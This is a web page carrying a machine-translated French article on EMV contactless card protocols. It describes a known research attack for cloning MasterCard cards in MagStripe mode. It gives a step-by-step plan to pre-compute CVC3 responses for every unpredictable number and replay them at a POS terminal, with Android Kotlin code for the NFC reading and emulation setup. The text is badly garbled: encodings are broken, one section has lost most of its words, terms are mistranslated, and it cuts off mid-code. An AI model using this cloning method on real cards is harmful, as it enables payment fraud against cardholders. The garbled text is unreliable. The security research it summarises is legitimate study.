<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëÇüèæ ‚úùÔ∏è üë∞ Clonez une carte sans contact √† l'aide d'une application mobile üóÑÔ∏è üëèüèø üóª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Il a toujours √©t√© int√©ressant de voir ce qui se passe sur une carte bancaire sous le ¬´capot¬ª. Comment le protocole de communication d'une carte bancai...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Clonez une carte sans contact √† l'aide d'une application mobile</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/421543/">  Il a toujours √©t√© int√©ressant de voir ce qui se passe sur une carte bancaire sous le ¬´capot¬ª.  Comment le protocole de communication d'une carte bancaire et d'un terminal PDV est mis en ≈ìuvre, comment il fonctionne et comment il est s√ªr.  Une telle opportunit√© s'est pr√©sent√©e √† moi lorsque je faisais un stage chez Digital Security.  En cons√©quence, lors de l'analyse d'une vuln√©rabilit√© connue des cartes EMV en mode MagStripe, il a √©t√© d√©cid√© de mettre en ≈ìuvre une application mobile capable de communiquer avec le terminal via une interface sans contact, en utilisant ses propres commandes et une analyse d√©taill√©e des demandes et des r√©ponses.  Et essayez √©galement d'impl√©menter la m√©thode de clonage des cartes MasterCard en mode MagStripe. <br><br>  Dans cet article, je vais essayer de d√©crire ce qu'est une carte EMV, comment elle fonctionne et comment en utilisant Android, vous pouvez essayer de cloner votre carte MasterCard. <br><br>  <i><b>"Il y a des choses que l'argent ne peut pas acheter.</b></i>  <i><b>Pour tout le reste, il y a MasterCard ¬ª</b></i> <br><br><h3>  Qu'est-ce qu'une carte EMV? </h3><br>  EMV est la norme internationale pour les cartes bancaires √† puce.  <b>E</b> uropay + <b>M</b> asterCard + <b>V</b> ISA a particip√© au d√©veloppement de cette norme, d'o√π le nom.  Essayons de comprendre comment la carte communique avec le terminal POS via une interface sans contact. <br><a name="habracut"></a><br>  Commen√ßons par les bases. <br><br>  Une carte physique sans contact EMV fonctionne presque comme une √©tiquette RFID.  Si elle est basique, la puce entre dans le champ √©lectromagn√©tique, et dans un circuit conducteur ferm√© (dans notre cas ce sera une antenne situ√©e autour du p√©rim√®tre), plac√©e dans un champ magn√©tique alternatif, un courant √©lectrique alternatif est g√©n√©r√©.  Ce courant charge un condensateur sp√©cial connect√© en parall√®le au circuit r√©sonnant de la carte.  L'√©nergie stock√©e dans le condensateur est utilis√©e pour r√©aliser une carte √† microcircuit pour diverses op√©rations.  Lorsque le lecteur modifie le champ √©lectromagn√©tique, les modifications seront imm√©diatement visibles sur la puce.  En utilisant la modulation du signal, nous pouvons transmettre des informations sous forme binaire.  Si vous connectez la r√©sistance de charge sur la carte et / ou modifiez la capacit√© du condensateur, vous pouvez modifier l'intensit√© du courant dans le circuit de la carte, ce qui entra√Ænera une modification du champ √©lectromagn√©tique cr√©√© par celle-ci dans la r√©gion du circuit du lecteur, donc la carte transmet des donn√©es.  Le lecteur devra d√©tecter ces changements.  Cette interaction physique est r√©gie par la norme ISO / CEI 14443 <i>¬´Cartes d'identification - Cartes √† circuits int√©gr√©s sans contact - Cartes de proximit√©¬ª</i> . <br><br>  La puce de carte elle-m√™me est une carte √† puce qui ex√©cute JavaCard, une version distincte de Java pour les plates-formes √† faibles ressources informatiques et prenant en charge les algorithmes cryptographiques.  JavaCard t√©l√©charge des applets, qui sont des applications.  Il existe √©galement une GlobalPlatform est un certain standard pour JavaCard, qui offre la possibilit√© de g√©rer en toute s√©curit√© les donn√©es sur la carte et vous permet de t√©l√©charger, modifier et supprimer des applications sur la carte.  Dans cet article, nous ne consid√©rerons pas les m√©canismes de s√©curit√© de la carte √† puce elle-m√™me.  Il suffit de savoir que les donn√©es prot√©g√©es, par exemple la cl√© priv√©e et la cl√© principale secr√®te de la carte, sont en lieu s√ªr et il est impossible de les supprimer √† l'aide de moyens standards. <br><br>  Je vous rappelle √©galement une petite terminologie pour ceux qui ne sont pas familiers. <br><br>  <b>POS-terminal</b> (Point of Sale) - appareil d'un vendeur qui lit une carte et initie un paiement.  De plus, nous appellerons cet appareil simplement un terminal. <br>  <b>La banque √©mettrice</b> est la banque qui a √©mis votre carte. <br>  <b>Acquirer Bank</b> - une banque qui √©met des terminaux de point de vente aux vendeurs et traite les paiements de leur part. <br>  <b>Le syst√®me de paiement</b> est le lien central entre la banque acqu√©reuse et la banque √©mettrice, absolument tous les paiements passent par celui-ci, et il sait quelle banque doit transf√©rer de l'argent.  Il existe de nombreux syst√®mes de paiement dans le monde, outre les c√©l√®bres <b>Visa</b> et <b>MasterCard,</b> il existe √©galement <b>American Express</b> , <b>China UnionPay</b> et le syst√®me de paiement russe <b>MIR</b> . <br><br>  Eh bien, la carte et le lecteur peuvent communiquer.  Ils s'envoient mutuellement des commandes APDU sous forme de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Tag-Length-Value</a> i.e.  le nom de la balise est transmis en hexad√©cimal, sa longueur et sa valeur elle-m√™me.  Toutes les commandes sont bien s√ªr d√©crites dans la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">documentation</a> et ressemblent √† ceci: <br><br><img src="https://habrastorage.org/webt/kn/ne/tj/knnetjhcx4h0rd7xijgzyv5goye.png" alt="image"><br><br>  La transaction EMV standard se d√©roule en plusieurs √©tapes, je d√©crirai l'algorithme d'interaction complet dans le cas d'une interface de contact, pour une interface sans contact l'algorithme est quelque peu raccourci: <br><br><ul><li>  S√©lection d'application; </li><li>  Initialisation du traitement des demandes; </li><li>  Lecture des donn√©es d'application </li><li>  Authentification hors ligne </li><li>  Contraintes de traitement; </li><li>  Ch√®que du titulaire de la carte; </li><li>  Gestion des risques du c√¥t√© du terminal; </li><li>  Analyse des actions terminales; </li><li>  Gestion des risques c√¥t√© carte; </li><li>  Analyse des actions de la carte; </li><li>  Traitement en ligne; </li><li>  L'ach√®vement de l'op√©ration. </li></ul><br><img src="https://habrastorage.org/webt/0y/sc/rd/0yscrdsiso65ccn0arqjwxc4joe.png" alt="image"><br><br>  Nous consid√©rons bri√®vement chaque op√©ration. <br><br>  S√©lection d'application.  Il arrive souvent qu'il puisse y avoir plusieurs applications sur une m√™me carte.  Par exemple, une carte bancaire et un billet de voyage.  Et le terminal doit en quelque sorte d√©terminer o√π et quel algorithme utiliser.  Le soi-disant <b>identifiant d'application (AID</b> ) est utilis√© pour s√©lectionner une application.  Pour comprendre cela, le terminal envoie une commande <b>SELECT</b> .  Par exemple, l' <b>AID de</b> la carte Visa Classic ressemblera √† ceci: <b>A0000000031010</b> .  Si plusieurs de ces codes viennent en r√©ponse et que le terminal peut fonctionner avec plusieurs applications, le terminal affichera une liste et proposera de s√©lectionner l'application dont nous avons besoin.  Si le terminal ne prend en charge aucun des codes d'application, l'op√©ration sera rejet√©e par le terminal. <br><br>  Initialisation du traitement des demandes.  Ici, l'emplacement g√©ographique est d'abord v√©rifi√©.  Par exemple, les cartes Maestro Momentum ne peuvent √™tre pay√©es qu'en Russie.  Cette √©tape est r√©alis√©e afin de donner aux √©metteurs la possibilit√© d'appliquer les m√©thodes de gestion des risques en ligne existantes lors de la conduite d'op√©rations hors ligne.  A ce stade, une transaction EMV peut √™tre annul√©e √† l'initiative de la carte elle-m√™me si ce type de transaction est interdit par l'√©metteur dans un pays donn√© du monde.  De plus, la carte transmet au terminal un ensemble d'informations sp√©cialement structur√©es contenant une description de la fonctionnalit√© de la carte et de l'application. <br><br>  Lisez les donn√©es d'application.  Diverses donn√©es de carte n√©cessaires √† la transaction sont transmises au terminal, par exemple le num√©ro de carte, la date d'expiration, le compteur de transactions et de nombreuses autres donn√©es.  Certains d'entre eux seront discut√©s plus tard. <br><br>  Exemples de donn√©es: <br><br><img src="https://habrastorage.org/webt/qq/af/8u/qqaf8ualsk94r5lgoqqz9gupznc.png" alt="image"><br><br>  Un certificat de la cl√© publique de la banque √©mettrice et de la carte elle-m√™me est √©galement transmis.  Afin que le terminal puisse v√©rifier la signature num√©rique de certaines donn√©es de carte, l' <b>infrastructure PKI</b> (Public Key Infrastructure) est utilis√©e.  En bref, le syst√®me de paiement a une paire de cl√©s - publique et priv√©e, et le syst√®me de paiement est pour tous les participants de l' <b>AC (Autorit√© centrale)</b> .  En effet, le syst√®me de paiement de chaque banque de l'√©metteur √©met une nouvelle paire de cl√©s, et g√©n√®re en m√™me temps un certificat de la cl√© publique de la banque de l'√©metteur, le signant avec la cl√© priv√©e CA.  En outre, lorsque la banque √©met une nouvelle carte, elle g√©n√®re en cons√©quence une paire de cl√©s pour la carte et g√©n√®re √©galement un certificat de la cl√© publique de la carte, la signant √† l'aide de la cl√© priv√©e de la banque.  Dans les terminaux, un certificat de cl√© publique est g√©n√©ralement c√¢bl√© pour diff√©rents syst√®mes de paiement.  Ainsi, lorsque la carte transmet le certificat de cl√© publique de la banque √©mettrice et le certificat de carte lui-m√™me, le terminal peut facilement contr√¥ler toute la cha√Æne √† l'aide de la cl√© publique du syst√®me de paiement.  Le terminal, √† l'aide de la cl√© publique du syst√®me de paiement, v√©rifie d'abord l'authenticit√© du certificat bancaire de l'√©metteur, s'il est authentique, il peut alors √™tre fiable et maintenant, en utilisant le certificat bancaire de l'√©metteur, vous pouvez v√©rifier le certificat de la carte elle-m√™me.  Plus de d√©tails dans l'article <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">sur la s√©curit√© EMV</a> . <br><br>  Authentification hors ligne.  Le terminal d√©termine le type de m√©thode d'authentification hors ligne prise en charge.  Il existe des statiques ( <b>authentification des donn√©es statiques - SDA</b> ), dynamiques ( <b>authentification des donn√©es dynamiques - DDA</b> ) et combin√©es ( <b>authentification des donn√©es combin√©es - CDA</b> ).  Ces m√©thodes sont √©galement bas√©es sur PKI.  <b>SDA</b> est juste des donn√©es sign√©es sur la cl√© priv√©e de la banque de l'√©metteur, <b>DDA</b> - le terminal envoie un num√©ro al√©atoire et la carte doit le signer en utilisant sa cl√© priv√©e, et le terminal v√©rifiera cette signature en utilisant le certificat de carte re√ßu pr√©c√©demment, de sorte que le terminal s'assurera que la carte a vraiment une cl√© priv√©e - elle est donc authentique.  <b>L'ADC</b> n'est qu'une combinaison des deux. <br><br>  Restrictions de manipulation.  Ici, le terminal v√©rifie les donn√©es pr√©c√©demment re√ßues de la carte pour la condition d'aptitude √† cette op√©ration.  Par exemple, il v√©rifie les dates de d√©but / fin de la date d' <b>expiration</b> de l'application <b>(balise '5F24')</b> et <b>la date d'entr√©e en vigueur de l'application (balise '5F25')</b> .  Il v√©rifie √©galement la version de l'application.  Les r√©sultats des op√©rations r√©alis√©es √† ce stade sont √©galement enregistr√©s dans le rapport <b>TVR (R√©sultats de la v√©rification des terminaux)</b> .  Sur la base des r√©sultats de cette √©tape, la transaction ne peut pas √™tre annul√©e, m√™me si, par exemple, l'application a expir√©. <br><br>  Ch√®que du titulaire de la carte.  La v√©rification du titulaire de la carte est effectu√©e afin d'authentifier la personne qui a fourni la carte et de v√©rifier s'il est le v√©ritable propri√©taire de la carte.  La norme EMV fournit diverses <b>m√©thodes de v√©rification du titulaire de carte</b> .  Les m√©thodes de v√©rification sont d√©finies √† la fois sur le terminal et sur la carte.  Ils sont contenus dans les <b>listes</b> dites <b>CVM</b> .  En cours d'ex√©cution, le terminal et la carte comparent les listes CVM re√ßues et s√©lectionnent la m√©thode de v√©rification g√©n√©rale. <br><br>  Liste des m√©thodes de v√©rification prises en charge: <br><br><ul><li>  Aucun CVM requis ('011111'b); </li><li>  √âchec du traitement CVM ('000000'b); </li><li>  Signature (¬´011110¬ª b); </li><li>  PIN crypt√© v√©rifi√© en ligne ('000010'b); </li><li>  V√©rification du code PIN en texte clair effectu√©e par ICC ('000001'b); </li><li>  V√©rification du code PIN en clair effectu√©e par ICC et signature ('000011'b); </li><li>  V√©rification du code PIN chiffr√© effectu√©e par ICC ('000100'b); </li><li>  V√©rification du code PIN chiffr√© effectu√©e par ICC et signature ('000101'b). </li></ul><br>  Ici, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">il y a</a> aussi des informations int√©ressantes √† ce sujet. <br><br>  Gestion des risques du c√¥t√© du terminal.  √Ä ce stade, le terminal effectue une v√©rification interne des param√®tres de transaction, sur la base des param√®tres de gestion des risques de la banque acqu√©reuse.  Les proc√©dures de gestion des risques peuvent √™tre effectu√©es par le terminal √† tout moment entre l'ach√®vement du processus de lecture des donn√©es de la carte et la formation de la premi√®re commande <b>GENERATE AC</b> par le terminal.  La gestion des risques c√¥t√© terminal comprend trois m√©canismes: <br><br><ul><li>  contr√¥le de la taille des op√©rations effectu√©es sur la carte ( <b>Floor Limit Checking</b> ); </li><li>  s√©lection al√©atoire de transactions pour l'autorisation en ligne de cette transaction par l'√©metteur ( <b>Random Transaction Selection</b> ); </li><li>  v√©rification de l'activit√© hors ligne de l'utilisation de la carte ( <b>Velocity Checking</b> ). </li></ul><br>  Analyse des actions terminales.  A ce stade, le terminal analyse les r√©sultats des √©tapes pr√©c√©dentes de la transaction.  Sur la base des r√©sultats de l'analyse, le terminal d√©cide s'il doit mener l'op√©ration en ligne, autoriser sa r√©alisation hors ligne ou rejeter l'op√©ration. <br><br>  Gestion des risques c√¥t√© carte.  La carte, apr√®s avoir re√ßu de la commande <b>GENERATE AC des</b> donn√©es sur la transaction, le terminal et les r√©sultats des v√©rifications du terminal, √† son tour, ex√©cute ses propres proc√©dures de gestion des risques et prend sa propre d√©cision sur la fa√ßon de terminer l'op√©ration. <br><br>  Analyse des actions de la carte.  √Ä ce stade, la carte termine les proc√©dures de gestion des risques et g√©n√®re un cryptogramme de r√©ponse au terminal.  Si la carte d√©cide d'approuver la transaction, un <b>certificat de transaction</b> est g√©n√©r√©.  Si la carte d√©cide d'effectuer l'op√©ration en temps r√©el, elle g√©n√®re alors un <b>ARQC (Authorization Request Cryptogram)</b> .  Si la carte utilise d'autres m√©thodes d'autorisation, le <b>renvoi d'autorisation d'application est utilis√©</b> .  Dans le cas o√π la carte rejette la transaction, alors <b>Cryptogramme d'authentification d'application</b> . <br><br>  Un autre <b>cryptogramme ARPC (Authorization Response Cryptogram)</b> est n√©cessaire pour authentifier l'√©metteur.  L'√©metteur g√©n√®re un cryptogramme ARPC et envoie le cryptogramme √† la carte, si la carte confirme le cryptogramme, alors l'√©metteur est authentifi√© par la carte. <br><br>  Un peu sur la s√©curit√© des cl√©s et l'authentification mutuelle de la carte et de l'√©metteur du livre de I. M. Goldovsky: <blockquote>  L'authentification mutuelle signifie que la carte et le terminal s'authentifient mutuellement en utilisant l'authentification des cryptogrammes ARQC et ARPC.  Les cryptogrammes sont des donn√©es g√©n√©r√©es √† l'aide d'une cl√© secr√®te (connue de la carte et de la banque de l'√©metteur), du num√©ro de transaction, du nombre al√©atoire g√©n√©r√© par le terminal, ainsi que de certains d√©tails de la transaction, du terminal et de la carte.  Dans le cas d'ARPC, le code de r√©ponse d'autorisation de l'√©metteur est √©galement ajout√© aux donn√©es r√©pertori√©es.  Sans conna√Ætre la cl√© secr√®te de la carte pour g√©n√©rer un cryptogramme, il est impossible de calculer les valeurs ARQC / ARPC pour le temps pr√©visible avec le niveau de technologie actuel, et donc le fait de leur v√©rification r√©ussie indique l'authenticit√© de la carte et de l'√©metteur.  L'authentification en ligne est le moyen le plus fiable d'authentifier une carte.  Cela est d√ª au fait qu'elle est r√©alis√©e directement par l'√©metteur, sans interm√©diaire sous la forme d'un terminal.  De plus, l'algorithme 3DES avec une cl√© temporaire de 112 bits est utilis√© pour l'authentification en ligne, dont la force cryptographique correspond √† la force cryptographique de l'algorithme RSA avec la longueur du module de cl√© asym√©trique utilis√©e pour l'authentification hors ligne de l'application de carte d√©passant 1700 bits.  L'utilisation de cl√©s asym√©triques de cette longueur sur la carte est encore assez rare.  G√©n√©ralement, des cl√©s d'une longueur de module de 1024, 1152 ou 1408 bits sont utilis√©es. </blockquote><br><br>  Au final, une transaction en ligne passe par une cha√Æne: <br>  <b>Carte &lt;--&gt; POS-Terminal &lt;--&gt; Acquisition bancaire &lt;--&gt; Syst√®me de paiement &lt;--&gt; √âmetteur bancaire.</b> <br><br><img src="https://habrastorage.org/webt/lg/od/lo/lgodlo0oz2jbpxbje3o15q9ikgs.jpeg" alt="image"><br><br><h3>  Clone MasterCard en mode MagStripe </h3><br>  Nous passons directement au principe du clonage.  Cette m√©thode d'attaque par carte sans contact a √©t√© publi√©e par deux chercheurs <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Michael Roland, Josef Langer</a> de l'Universit√© d'Autriche.  Il est bas√© sur un principe g√©n√©ral appel√© <i>√©cr√©mage</i> .  C'est un tel sc√©nario dans lequel un attaquant vole de l'argent d'une carte bancaire en lisant (copiant) les informations de cette carte.  Dans le cas g√©n√©ral, il est important de garder le PIN secret et de ne pas le divulguer.  Mais dans la m√©thode des gars autrichiens, nous n'avons pas besoin de le savoir.  Le clonage d'une carte de paiement est r√©ussi pour la version noyau de l'application EMV Contactless Kernel 2. La version de ce protocole prend en charge deux modes de fonctionnement pour les cartes sans contact: le protocole EMV <b>(MasterCard PayPass M / Chip)</b> et <b>MagStripe (MasterCard PayPass MagStripe)</b> . <br><br>  <b>MagStripe</b> est un mode de support de carte √† bande magn√©tique.  Ce mode est impl√©ment√© sur les cartes MasterCard avec une interface sans contact.  Le mode MagStripe est tr√®s probablement n√©cessaire pour les banques qui ont du mal √† transf√©rer toute l'infrastructure pour prendre en charge les transactions EMV sans contact sur puce.  Soit dit en passant, les cartes Visa ont √©galement un mode de fonctionnement similaire - <b>PayWave MSD (Magnetic Stripe Data)</b> . <br><br>  Le processus de traitement des transactions pour les cartes sans contact est tronqu√© par rapport aux cartes √† puce et fonctionne g√©n√©ralement dans le mode suivant: <br><br><ol><li>  Le terminal envoie une commande <b>SELECT PPSE</b> (Proximity Payment System Environment).  La carte envoie une liste des applications prises en charge. </li><li>  Le terminal envoie une commande <b>SELECT</b> .  En r√©ponse, il re√ßoit les d√©tails de la demande n√©cessaires. </li><li>  Le terminal envoie la commande <b>GET_PROCESSING_OPTIONS</b> .  La carte r√©pond au type d'authentification qu'elle prend en charge et s'il existe une v√©rification du titulaire de la carte. </li><li>  Le terminal envoie la commande <b>READ_RECORDS</b> .  La carte en r√©ponse envoie Track1 et Track2 presque la m√™me que celle enregistr√©e sur la bande magn√©tique de la carte. </li><li>  Le terminal envoie la commande <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .  Ce qui signifie que la carte doit g√©n√©rer une valeur CVC3 bas√©e sur le nombre impr√©visible transmis. </li></ol><br><img src="https://habrastorage.org/webt/yx/4k/go/yx4kgocqjxhraaeqz1c4qr4ukpe.jpeg" alt="image"><br><br><div class="spoiler">  <b class="spoiler_title">√Ä quoi cela ressemble-t-il dans la vraie vie?</b> <div class="spoiler_text">  Cela ressemble √† une √©quipe <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">APDU</a> .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Liste de toutes les balises</a> . <br><br>  APDU - Application Protocol Data Unit est un symbole d'une trame avec une commande de carte ou une r√©ponse de carte. <br><br>  Il y a quelques articles sur ce sujet <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br></div></div><br>  La carte prend en charge la commande sp√©ciale COMPUTE CRYPTOGRAPHIC CHECKSUM, dont l'argument correspond aux donn√©es d√©finies dans l'objet de donn√©es de nombre impr√©visible (UDOL).  <b>En cons√©quence, la carte utilisant l'algorithme 3DES et la cl√© secr√®te calcule la valeur dynamique CVC3 (Card Verification Code).</b>  Comme argument de la fonction 3DES, la concat√©nation des donn√©es UDOL et le compteur de transactions (Application Transaction Counter, ATC) sont utilis√©s.  <b>Ainsi, la valeur de CVC3 d√©pend toujours des objets UN et ATC.</b> <br><br>  En d'autres termes, cette commande est n√©cessaire pour que la carte g√©n√®re une certaine ¬´signature¬ª afin que l'√©metteur puisse v√©rifier la carte.  Cependant, la signature de la transaction elle-m√™me manque dans cette signature.  La signature contient des valeurs <b>ATC - 2 octets</b> , <b>CVC3 (Track1) - 2 octets</b> , <b>CVC3 (Track2) - 2 octets</b> , qui sont g√©n√©r√©es par la carte sur la base de la cl√© secr√®te, que la banque √©mettrice et le compteur de transactions (ATC) connaissent √©galement.  Dans le m√™me temps, pour g√©n√©rer la signature, le terminal de point de vente informe la carte <b>UN (Num√©ro impr√©visible)</b> - 4 octets, qui est √©galement utilis√©e dans la g√©n√©ration de la signature.  Un nombre impr√©visible emp√™che la g√©n√©ration de codes d'authentification sur une vraie carte pour une utilisation ult√©rieure dans des transactions frauduleuses.  Pour l'attaque, l'ONU interf√®re fortement avec nous, car il n'est pas possible d'√©num√©rer 4 octets sans d√©passer les limites du compteur de transactions.  Cependant, il y a quelques faiblesses dans la sp√©cification de ceci. <br><br>  Premi√®rement, la sp√©cification limite l'ONU au codage des nombres, √† savoir le <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">code d√©cimal binaire (BCD)</a> , ce qui signifie essentiellement que si nous regardons un tel nombre cod√© dans HEX, nous ne verrons que les nombres de 0 √† 9, toutes les autres valeurs sont prises en compte comme interdit.  Ainsi, le montant des Nations Unies passe de 4 294 967 295 √† 99 999 999. <br><br>  Deuxi√®mement, le nombre de chiffres UN significatifs est d√©termin√© par la carte.  Ainsi, selon les param√®tres sp√©ciaux des pistes, le nombre de chiffres dans l'ONU peut aller de 10 √† 10 000, selon le type de carte, en pratique, 1000 valeurs sont le plus souvent trouv√©es. <br><br>  <b>Ainsi, le plan d'attaque est le suivant:</b> <br><br><ol><li>  Nous lisons la carte et d√©couvrons le nombre de chiffres significatifs de l'ONU, que le terminal fournira </li><li>  Nous trions tous les UN, obtenons toutes les valeurs possibles de la fonction <b>COMPUTE_CRYPTOGRAHIC_CHECKSUM</b> , les sauvegardons dans le tableau correspondant avec le mapping UN -&gt; R√©sultat </li><li>  Nous l'apportons au terminal POS, nous d√©couvrons le num√©ro que le terminal POS demande. </li><li>  Nous s√©lectionnons le r√©sultat souhait√© dans le tableau et le substituons en r√©ponse au terminal. </li><li>  La transaction s'en va. </li><li>  PROFIT.  Mais le succ√®s de l'approbation de la transaction n'est pas garanti, car la banque √©mettrice peut rejeter une telle transaction. </li></ol><br><img src="https://habrastorage.org/webt/5q/iw/uh/5qiwuhgbebcdx_0bdzdbrvwmcd0.jpeg" alt="image"><br><br>  Il convient √©galement de noter que le compteur de transactions (ATC) emp√™che la r√©utilisation des codes d'authentification pr√©c√©demment utilis√©s, ce qui signifie que si nous avons utilis√© cette attaque, nous devons recopier la carte, car le compteur de transactions a d√©j√† √©t√© utilis√© pour obtenir des informations et a √©t√© utilis√© dans la signature, ce qui signifie que si nous avions un compteur de transactions de 1000, et apr√®s avoir envoy√© la transaction √† la banque, la banque n'acceptera plus les transactions avec un compteur inf√©rieur √† &lt;1001.  ,    2 ,  ,       65   ,       . <br><br>           . ,  <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .    CVC3 ,       <b>SELECT</b> ,  <b>GET_PROCESSING_OPTIONS</b> ,    <b>COMPUTE_CRYPTOGRACHIC_CHECKSUM</b>     .       CVC3.         , <b> 1000   Google Galaxy Nexus S    .</b> <br><br>         <b>Terminal Simulator</b>  MasterCard.      NFC-    .      .        POS-           .         ,    . <br><br><img src="https://habrastorage.org/webt/if/cw/ka/ifcwkapz8euoz-fdb9hnmbedigq.png" alt="image"><br><br>     NFC  <b>ACR122</b> . <br><br><img src="https://habrastorage.org/webt/kx/75/q8/kx75q8xlkxsg3q3hodn9h1yze2o.jpeg" alt="image"><br><br>        .      Kotlin  Android.      . <br><br><pre><code class="plaintext hljs">data class Command( var CLA: String = 0x00.toString(), var INS: String = 0x00.toString(), var P1: String = "", var P2: String = "", var Lc: String = "", var Nc: String = "", var Le: String = "", var Nr: String = "", var SW1WS2: String = "" ) { fun split(): ByteArray { return getHexString().hexToByteArray() } fun getHexString() = CLA.plus(INS).plus(P1).plus(P2).plus(Lc).plus(Nc).plus(Le).plus(Nr).plus(SW1WS2) }</code> </pre> <br>  Tout d'abord, nous devons configurer le travail avec NFC.  Au t√©l√©phone, nous pouvons travailler en deux modes.  En mode carte, c'est lorsque nous r√©pondons aux commandes du terminal, et en mode terminal lorsque nous envoyons des commandes et lisons, par exemple, une carte.  C'est-√†-dire  tout d'abord, nous pouvons cloner la carte, puis nous assurer que nous r√©pondons aux demandes du terminal avec des commandes d√©j√† pr√©par√©es. <br><br>  Voici une impl√©mentation simplifi√©e de l'interaction avec NFC: <br><br><pre> <code class="plaintext hljs"> private var nfcAdapter: NfcAdapter? = null /*!&lt; represents the local NFC adapter */ private var tag: Tag? = null /*!&lt; represents an NFC tag that has been discovered */ private lateinit var tagcomm: IsoDep /*!&lt; provides access to ISO-DEP (ISO 14443-4) */ private val nfctechfilter = arrayOf(arrayOf(NfcA::class.java.name)) /*!&lt; NFC tech lists */ private var nfcintent: PendingIntent? = null .... override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) nfcAdapter = NfcAdapter.getDefaultAdapter(this) nfcintent = PendingIntent.getActivity(this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0) cardEmulation = CardEmulation.getInstance(nfcAdapter) nfcAdapter?.enableForegroundDispatch(this, nfcintent, null, nfctechfilter) } .... override fun onNewIntent(intent: Intent) { super.onNewIntent(intent) tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG) cardReading(tag) } ..... override fun onResume() { super.onResume() if (canSetPreferredCardEmulationService()) { this.cardEmulation?.setPreferredService(this, ComponentName(this, "com.nooan.cardpaypasspass.NfcService")); } } override fun onPause() { if (canSetPreferredCardEmulationService()) { this.cardEmulation?.unsetPreferredService(this) } super.onPause() } private fun cardReading(tag: Tag?) { tagcomm = IsoDep.get(tag) try { tagcomm.connect() } catch (e: IOException) { error = "Reading card data ... Error tagcomm: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } try { when { commands != null -&gt; readCardWithOurCommands() mChip -&gt; readCardMChip() else -&gt; readCardMagStripe() } } catch (e: IOException) { error = "Reading card data ... Error tranceive: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } finally { tagcomm.close() } } protected fun execute(command: Command, log:Boolean): ByteArray { val bytes = command.split() listLogs.add(bytes.toHex()) val recv = tagcomm.transceive(bytes) listLogs.add(recv.toHex()) return recv }</code> </pre><br>  Ceci d√©crit la s√©quence de commandes et √©num√®re les valeurs de Nombre impr√©visible dans un cycle de 0 √† 999, nous changeons Nc en "00000 $ {String.format ("% 03d ", i)}". Remplacez (".. (?! $ ) ". toRegex ()," $ 0 ").  Et n'oubliez pas d'ex√©cuter GET_PROCESSING_OPTIONS √† chaque fois avant COMPUTE_CRYPTOGRAPHIC_CHECKSUM sinon le montant du ch√®que ne sera pas calcul√©. <br><br>  En cons√©quence, tout cela peut √™tre √©crit dans un fichier et d√©j√† utilis√© lorsque vous travaillez avec ce terminal.  Ici, nous obtenons le nom et le num√©ro de carte, nous pouvons l'afficher √† l'√©cran. <br><br><pre> <code class="plaintext hljs"> private 